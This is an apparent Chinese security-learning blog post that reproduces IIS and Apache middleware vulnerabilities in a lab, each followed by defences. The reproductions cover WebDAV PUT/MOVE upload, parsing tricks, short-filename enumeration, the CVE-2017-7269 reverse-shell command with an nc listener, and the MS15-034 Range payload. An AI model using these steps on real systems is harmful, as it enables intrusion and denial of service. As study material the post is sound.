<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="𝐴_𝑌𝑢">





<title>中间件漏洞 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 

<header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">△ 顶部</a>
        <a onclick="go_bottom()">▽ 底部</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "▼ 收起目录"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "▶︎ 展开目录"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">中间件漏洞</h1>
            
                <div class="post-meta">
                    
                        <!--作者:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--发布时间:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-05-10&nbsp;&nbsp;8:05:57</a> &nbsp;
                        </span>
                    
                    
                    
                    <span id="/2022/05/10/22-0510-01/" class="leancloud-visitors view" data-flag-title="中间件漏洞">
                        <text class="post-meta-item-text">
                            <!--阅读数:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">加载中</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="put漏洞"><a href="#put漏洞" class="headerlink" title="put漏洞"></a>put漏洞</h3><p>目标网站upload.moonteam.com搭建在IIS上，并且IIS Server 在 Web 服务扩展中开启了 WebDAV</p>
<img src="/2022/05/10/22-0510-01/image-20220513161754619.png" alt="image-20220513161754619" style="zoom:80%;">

<p> 同时目标网站upload.moonteam.com配置了可以写入的权限</p>
<img src="/2022/05/10/22-0510-01/image-20220513162427686.png" alt="image-20220513162427686" style="zoom:80%;">

<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>对目标网站进行burp抓包，然后将GET改成OPTIONS，查看支持的协议</p>
<img src="/2022/05/10/22-0510-01/image-20220513163501850.png" alt="image-20220513163501850" style="zoom:80%;">

<p>改成OPTIONS后，发现支持PUT上传方式，当然也支持MOVE（重命名）</p>
<img src="/2022/05/10/22-0510-01/image-20220513163707880.png" alt="image-20220513163707880" style="zoom:80%;">

<p>然后通过put上传一个文本文档到目标网站中</p>
<img src="/2022/05/10/22-0510-01/image-20220513164032816.png" alt="image-20220513164032816" style="zoom:80%;">

<p>成功上传到目标网站中</p>
<img src="/2022/05/10/22-0510-01/image-20220513164233469.png" alt="image-20220513164233469" style="zoom:80%;">

<p>然后通过MOVE重命名把ayu.txt改成ayu.asp</p>
<img src="/2022/05/10/22-0510-01/image-20220513164824878.png" alt="image-20220513164824878" style="zoom:80%;">



<p>修改成功</p>
<img src="/2022/05/10/22-0510-01/image-20220513165825800.png" alt="image-20220513165825800" style="zoom:80%;">

<p>后续的操作就无需多言了，但这里为啥我们不直接通过PUT上传ayu.asp呢？因为一般直接上传都是失败的，所以先上传txt文件，然后再通过MOVE修改成asp文件</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
<li>关闭webdav</li>
<li>关闭写入权限</li>
</ol>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><p>该版本的IIS会默认将<code>*.asp;.jpg</code> 此种格式的文件名，当成Asp解析。服务器默认不解析 <code>;</code> 号及其后面的内容，相当于截断</p>
<p>由于在目标网站的属性—主目录—配置—映射—应用程序扩展—编辑，查看到<code>.asa</code>被映射到了可执行文件<code>C:\WINDOWS\system32\inetsrv\asp.dll</code>，也就是说<code>.asa</code>可以被解析成<code>.asp</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513170825522.png" alt="image-20220513170825522" style="zoom:80%;">

<p>基于上述配置，除了.asa会被解析成.asp外，cer、cdx都会被解析成asp，也就是说<code>cer</code>、<code>cdx</code>、<code>asa</code>扩展名都会被解析成<code>asp</code></p>
<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>我们的目标网站中已经提前上传了一个图片<code>sb.asp;1.jpg</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513172555287.png" alt="image-20220513172555287" style="zoom:80%;">

<p>由于漏洞，所以<code>sb.asp;1.jpg</code>会被解析成<code>sb.asp</code>，而sb.asp是一个木马，我们访问该图片实际就是访问sb.asp木马，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513172912087.png" alt="image-20220513172912087" style="zoom:80%;">

<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><ol>
<li>禁止创建和上传此类畸形文件</li>
<li>图片存放目录设置成禁止脚本文件执行</li>
<li>升级iis版本</li>
</ol>
<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><p>该版本默认将 <code>*.asp/</code> 目录下的所有文件当成Asp解析</p>
<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>目标网站下的c.asp文件夹下有一个asp的图片马1.jpg</p>
<img src="/2022/05/10/22-0510-01/image-20220513173410570.png" alt="image-20220513173410570" style="zoom:80%;">

<p>访问c.sap文件夹下的1.jpg，实际上会将1.jpg解析成1.asp木马，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513173530870.png" alt="image-20220513173530870" style="zoom:80%;">

<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><ol>
<li>禁止创建此类文件夹</li>
<li>升级iis版本</li>
</ol>
<h3 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h3><p>Windows 支持以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件、</p>
<p><strong>短文件名产生的条件</strong></p>
<ul>
<li>注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>中 <code>NtfsDisable8dot3NameCreation</code>的值为0</li>
<li>当文件后缀名字符长度小于4时，短文件名的产生需要文件名前缀字符长度大于9位</li>
<li>当文件后缀名字符长度大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名</li>
</ul>
<p><strong>短文件名的特征</strong></p>
<ul>
<li><p>只显示前6位的字符,后续字符用~1代替，其中数字1是可以递增。如果存在文件名类似的文件，则前面的6个字符是相同的,后面的数字进行递增</p>
<img src="/2022/05/10/22-0510-01/image-20220513220308797.png" alt="image-20220513220308797" style="zoom:80%;">
</li>
<li><p>后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断</p>
<img src="/2022/05/10/22-0510-01/image-20220513220530626.png" alt="image-20220513220530626" style="zoom:80%;">
</li>
<li><p>所有小写字母均转换成大写的字母</p>
<img src="/2022/05/10/22-0510-01/image-20220513220638045.png" alt="image-20220513220638045" style="zoom:80%;">
</li>
<li><p>长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀</p>
<img src="/2022/05/10/22-0510-01/image-20220513220822135.png" alt="image-20220513220822135" style="zoom:80%;">
</li>
<li><p>长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符,不论长度均会生成短文件</p>
<img src="/2022/05/10/22-0510-01/image-20220513221236003.png" alt="image-20220513221236003" style="zoom:80%;"></li>
</ul>
<p>如下，可以通过 <code>dir /x</code> 查看短文件名（同时参考上面短文件名产生的条件）</p>
<img src="/2022/05/10/22-0510-01/image-20220513215739094.png" alt="image-20220513215739094" style="zoom:80%;">

<h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>IIS 8.0 以下版本需要开启 ASP.NET 支持（如果IIS &gt;&#x3D;8.0 版本,即使没有安装 ASP.NET ，通过 OPTIONS 和 TRACE 方法也可以猜解成功）</p>
<p>由于这里是IIS 6.x ，所以首先开启ASP.NET支持，开启方法如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513175118578.png" alt="image-20220513175118578" style="zoom:80%;">

<p>查看当前网站目录下的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225756156.png" alt="image-20220513225756156" style="zoom:80%;">

<p><strong>验证存在短文件名漏洞</strong></p>
<p>只要有短文件名，那么基本都会有<code>~1</code>，通过正则表达式通配符<code>*</code>可以匹配到其它的字符，比如：<code>1234~1.JPE</code>，第一个<code>*</code>匹配<code>1234</code>，第二个<code>*</code>匹配<code>.JPE</code>，这样<code>*~1*</code>，就能匹配到<code>1234~1.JPE</code>。</p>
<p>所以只要短文件名，基本都有<code>~1</code>，而通过<code>*~1*</code>则能够匹配到短文件名</p>
<p>访问<code>http://upload.moonteam.com/*~1*/a.aspx</code>出现404，说明目标网站中存在短文件名（a.aspx没看懂有啥用，但貌似必须要有）</p>
<img src="/2022/05/10/22-0510-01/image-20220513223500472.png" alt="image-20220513223500472" style="zoom:80%;">

<p>通过浏览器访问短文件名<code>bbbbb*~1*</code>，返回400，说明<code>bbbbb*~1*</code>无法匹配到短文件名，也就是没有相关的短文件名</p>
<p>访问<code>http://upload.moonteam.com/bbbbb*~1*/a.aspx</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513224950889.png" alt="image-20220513224950889" style="zoom:80%;">

<p>通过访问上面两个payload，根据返回的404和400状态码，可判断出目标网站存在短文件漏洞</p>
<p><strong>猜解短文件名</strong></p>
<p>访问<code>http://upload.moonteam.com/1*~1*/a.aspx</code>，出现404，说明<code>1*~1*</code>可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225316106.png" alt="image-20220513225316106" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/12*~1*/a.aspx</code>，出现404，说明<code>12*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225439612.png" alt="image-20220513225439612" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/123*~1*/a.aspx</code>，出现404，说明<code>123*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225506172.png" alt="image-20220513225506172" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/1234*~1*/a.aspx</code>，出现404，说明<code>1234*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225537245.png" alt="image-20220513225537245" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/12345*~1*/a.aspx</code>，出现400，说明<code>12345*~1*</code>匹配不到到目标网站的短文件名，也就是说目标的短文件名的前缀为1234</p>
<img src="/2022/05/10/22-0510-01/image-20220513225834496.png" alt="image-20220513225834496" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/1234*~1.jpe*/a.aspx</code>出现404，说明短文件名就是<code>1234.jpe</code>，但是一般没有jpe这样格式的文件，而结合短文件名的特点，猜解出1234.jpe这个短文件名对应的文件可能是1234.jpeg</p>
<img src="/2022/05/10/22-0510-01/image-20220513230150625.png" alt="image-20220513230150625" style="zoom:80%;">

<p><strong>利用脚本猜接短文件名</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/shelldownow/python3-iis_shortname_Scan-">https://github.com/shelldownow/python3-iis_shortname_Scan-</a></p>
<p><strong>短文件名漏洞的局限性</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</span><br><span class="line">如果文件名本身太短（无短文件名）也是无法猜解的</span><br><span class="line">如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</span><br><span class="line">如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</span><br><span class="line">不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</span><br></pre></td></tr></table></figure>

<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><ol>
<li><p>升级.net framework</p>
</li>
<li><p>修改注册表键值<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>修改<code>NtfsDisable8dot3NameCreation</code>为1，修改完成后,需要重启系统生效。也可通过命令行 <code>fsutil behavior set disable8dot3 1</code>关闭短文件名）</p>
<p>注意：注:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消失。如果不重新复制，已经存在的短文件名则是不会消失的。</p>
</li>
</ol>
<h3 id="IIS-RCE-CVE-2017-7269"><a href="#IIS-RCE-CVE-2017-7269" class="headerlink" title="IIS RCE-CVE-2017-7269"></a>IIS RCE-CVE-2017-7269</h3><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 If:&lt;http:&#x2F;&#x2F; 开头的长标头执行任意代码 PROPFIND请求</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p>
<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>exp地址：<a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python iis 192.168.0.115 80 192.168.0.154 9999 </span><br><span class="line">nc -lvnp 9999</span><br><span class="line">//192.168.0.115是目标网站ip，80是目标网站对应的端口，192.168.0.154是攻击主机的ip</span><br><span class="line">//nc -lvnp 9999在攻击主机上做监听</span><br></pre></td></tr></table></figure>

<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><ol>
<li>关闭 WebDav服务</li>
<li>升级</li>
<li>部署安全设备</li>
</ol>
<h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p><strong>原理</strong></p>
<p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png解析为php文件</p>
<h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>目标网站<code>http://192.168.43.29:8980/</code>上面存在1.txt文件，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220514151801695.png" alt="image-20220514151801695" style="zoom:80%;">

<p>加上<code>/.php</code>后，访问<code>http://192.168.43.29:8980/1.txt/.php</code>，即可把txt解析成php文件</p>
<img src="/2022/05/10/22-0510-01/image-20220514152053378.png" alt="image-20220514152053378" style="zoom:80%;">

<h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><ol>
<li><p>配置cgi.fix_pathinfo(php.ini中)为0，并重启php-cgi程序</p>
<p>配置后再次访问</p>
<img src="/2022/05/10/22-0510-01/image-20220514153746990.png" alt="image-20220514153746990" style="zoom:80%;">
</li>
<li><p>配置IIS管理器，如下</p>
<img src="/2022/05/10/22-0510-01/image-20220514154003642.png" alt="image-20220514154003642" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220514154150828.png" alt="image-20220514154150828" style="zoom:80%;">

</p><p>配置后再次访问</p>
<img src="/2022/05/10/22-0510-01/image-20220514154242394.png" alt="image-20220514154150828" style="zoom:80%;"></li>
</ol>
<h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><p><strong>介绍</strong></p>
<p>HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS</p>
<p>HTTP.SYS远程代码执行漏洞实质是HTTP.SYS的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码</p>
<p>主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响验证这个漏洞</p>
<p><strong>影响范围</strong></p>
<p>Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和 Windows server 2012 R2</p>
<h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>访问目标网站<code>http://192.168.43.29/</code>并burp抓包</p>
<img src="/2022/05/10/22-0510-01/image-20220514160810529.png" alt="image-20220514160810529" style="zoom:80%;">

<p>插入payload<code>Range: bytes=0-18446744073709551615</code> ，然后发送，得到304状态码，如果是416状态码，则证明存在该漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514160935846.png" alt="image-20220514160935846" style="zoom:80%;">

<p>删除部分请求头的内容</p>
<img src="/2022/05/10/22-0510-01/image-20220514161116936.png" alt="image-20220514161116936" style="zoom:80%;">

<p>得到416，证明目标网站存在该漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514161150142.png" alt="image-20220514161150142" style="zoom:80%;">

<p>利用相关exp可以攻击该网站，可以让网站变得卡顿，或者电脑直接蓝屏等</p>
<p>exp：<a target="_blank" rel="noopener" href="https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC">https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC</a></p>
<p>利用exp脚本</p>
<img src="/2022/05/10/22-0510-01/image-20220514161920326.png" alt="image-20220514161920326" style="zoom:80%;">

<p>攻击后，目标网站电脑如下</p>
<img src="/2022/05/10/22-0510-01/image-20220514161816419.png" alt="image-20220514161816419" style="zoom:80%;">

<h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><ol>
<li>安装修复补丁（KB3042553）</li>
</ol>
<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><p>Apache 是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。</p>
<p>Apache 是跨平台纯粹的 web 服务器，负责接收处理&#x2F;响应 http 请求，之所以说它是纯粹的 web 服务器，是因为 apache 对于 html 页面的解析能力很强，但是不能解析嵌入页面内的服务器端脚本代码（如：jsp&#x2F;servlet），那么 apache 无法直接解析 .php 文件的，如果要解析 .php文件 ，还需要 php 处理器，即，apache 负责接收和响应 http 请求，若请求中涉及到 .php 文件，那么 apache 会将该文件发送给 php 处理器处理，php 处理器解析完成后，生成 html 文件，并将该 html 文件发送给 apache，再由 apache 返回最终的结果给浏览器。</p>
<p>Apache与php有三种结合方式：</p>
<ol>
<li>CGI</li>
<li>FastCGI</li>
<li>Module</li>
</ol>
<p>Apache默认是以Module模式运行php，如果想要以FastCGI方式运行php（自行百度）</p>
<h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><strong>漏洞原理</strong></p>
<p>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析，如果都不认识将会暴露源码。比如：上传了一个名字叫lcx.php.qqq 的文件，当此特性存在的时候，一看.qqq不认识，继续解析，.php我认识，解析成php文件了</p>
<p>那么哪些后缀Apache不认识？不在mime.types当中的都不认识（mime.types在Apache的安装目录下）</p>
<img src="/2022/05/10/22-0510-01/image-20220514165214836.png" alt="image-20220514165214836" style="zoom:80%;">



<p><strong>漏洞存在条件</strong></p>
<ol>
<li>使用 module 模式与 php 结合的所有版本 apache 存在未知扩展名解析漏洞</li>
<li>使用 fastcgi 模式与 php 结合的所有版本 apache 不存在此漏洞</li>
<li>利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt&#x2F;html文档处理</li>
</ol>
<h3 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h3><p>这里的目标网站搭建在kali上，因为kali是自带apache	的，查看kali中自带apache的版本</p>
<img src="/2022/05/10/22-0510-01/image-20220514193339694.png" alt="image-20220514193339694" style="zoom:80%;">

<p>首先运行apache</p>
<img src="/2022/05/10/22-0510-01/image-20220514193714687.png" alt="image-20220514193714687" style="zoom:80%;">

<p>查看apache与php的结合方式<code>/usr/sbin/apachectl -M | grep php</code>，这里默认是module</p>
<img src="/2022/05/10/22-0510-01/image-20220514203126234.png" alt="image-20220514203126234" style="zoom:80%;">

<p>前面提到了 apache 需要将文件交给 php 处理器，那么，apache 是如何能够确定将 .php 文件交给 php处理器的呢？为啥不能够将 .txt 文件交给 php 处理器呢？</p>
<p>进入mods-enabled路径下</p>
<img src="/2022/05/10/22-0510-01/image-20220514204444805.png" alt="image-20220514204444805" style="zoom:80%;">

<p>查看php7.4.conf</p>
<img src="/2022/05/10/22-0510-01/image-20220514204518708.png" alt="image-20220514204518708" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220514204803577.png" alt="image-20220514204803577" style="zoom:80%;">

</p><p>在正则表达式中 $ 是从字符串的末尾开始匹配，如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符”\n”或”\r”。根据上面的正则表达式<code>.+\.ph(ar|p|tml)$</code>，会匹配 .php|.phar|.phtml，也就是说，apache 会将这些后缀名的文件交给 php 处理器，但是如果我们把最后的 <code>$</code> 改成 <code>\.</code>，	那么就会匹配 .php|.phar|.phtml 后面的 .* 文件，比如：1.php.bak，就会被匹配到，但是 apache  不认识 1.php.abk 最后的后缀名 .abk ，所以会从最后继续向左识别，最终识别出 1.php，然后再把 1.php 交给 php 处理器来处理，解析成 php 文件</p>
<p>进行修改后，退出保存</p>
<img src="/2022/05/10/22-0510-01/image-20220514210931163.png" alt="image-20220514210931163" style="zoom:80%;">

<p>然后在 &#x2F;var&#x2F;www&#x2F;html 中创建 1.php.bak ，并在里面写入  <code>&lt;?php phpinfo();?&gt;</code></p>
<img src="/2022/05/10/22-0510-01/image-20220514211159551.png" alt="image-20220514211159551" style="zoom:80%;">

<p>然后重启apache<code>sudo service apache2 restart</code>，kali上访问 1.php.bak</p>
<img src="/2022/05/10/22-0510-01/image-20220514211350847.png" alt="image-20220514211350847" style="zoom:80%;">

<h3 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为 .php. 的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow </span><br><span class="line">Deny from all </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：</p>
<p>$filename &#x3D; str_replace(‘.’, ‘_’, $filename);</p>
</li>
</ol>
<h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>由于配置不到导致的漏洞</p>
<h3 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h3><p>这里采用phpstudy2016搭建，apache版本是2.4.23，php版本是5.3.29</p>
<img src="/2022/05/10/22-0510-01/image-20220514214021174.png" alt="image-20220514214021174" style="zoom:80%;">

<p>在httpd.conf中配置不当</p>
<img src="/2022/05/10/22-0510-01/image-20220514214315835.png" alt="image-20220514214315835" style="zoom:80%;">

<p>如果不小心删除了前面的#</p>
<img src="/2022/05/10/22-0510-01/image-20220514214407795.png" alt="image-20220514214407795" style="zoom:80%;">

<p>那么就会导致漏洞，在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，不需要是最后一个后缀</p>
<p>访问 1.php.bak 文件，竟然没有成功解析</p>
<img src="/2022/05/10/22-0510-01/image-20220514214845410.png" alt="image-20220514214845410" style="zoom:80%;">

<p>我们更换下apache和php的版本，apache版本还是2.4.23，但是php版本切换成了5.2.17</p>
<img src="/2022/05/10/22-0510-01/image-20220514215003151.png" alt="image-20220514215003151" style="zoom:80%;">

<p>再次尝试即可成功</p>
<img src="/2022/05/10/22-0510-01/image-20220514215111551.png" alt="image-20220514215111551" style="zoom:80%;">

<p>注意：该漏洞php版本还要低一些才可以</p>
<h3 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为 .php. 的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow </span><br><span class="line">Deny from all </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
